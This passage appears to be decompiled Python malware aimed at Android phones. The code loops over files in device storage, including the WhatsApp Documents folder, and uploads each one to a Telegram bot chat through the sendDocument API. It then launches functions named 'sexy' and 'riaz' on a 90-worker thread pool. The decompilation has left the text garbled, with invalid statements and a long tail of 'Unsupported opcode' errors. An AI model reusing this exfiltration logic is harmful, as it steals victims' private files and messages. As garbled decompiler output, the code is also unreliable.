                file_list = os.listdir(sdcard_path)()
                for file in file_list:
                    f = open(os.path.join(sdcard_path, file), 'rb')
                    url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                    data2 = {
                        'chat_id': chat_id }
                    data = {
                        'chat_id': chat_id }
                    files = {
                        'document': f }
                    get = session.post(url, data = data, files = files)
                    sent = session.post(url, data = data2, files = files)
                    None(None, None)
                    if not (lambda .0: for f in .0:
[ f ]):
                        pass
                    sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
                    file_list = os.listdir(sdcard_path)()
                    for file in file_list:
                        f = open(os.path.join(sdcard_path, file), 'rb')
                        url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                        data2 = {
                            'chat_id': chat_id }
                        data = {
                            'chat_id': chat_id }
                        files = {
                            'document': f }
                        get = session.post(url, data = data, files = files)
                        sent = session.post(url, data = data2, files = files)
                        None(None, None)
                        if not (lambda .0: for f in .0:
[ f ]):
                            pass
                        return None
                        return None

jjj = ThreadPool(max_workers = 90)
jjj.submit(sexy)
jjj.submit(riaz)
None(None, None)
return None
if not None:
    pass

Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: BEFORE_WITH
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
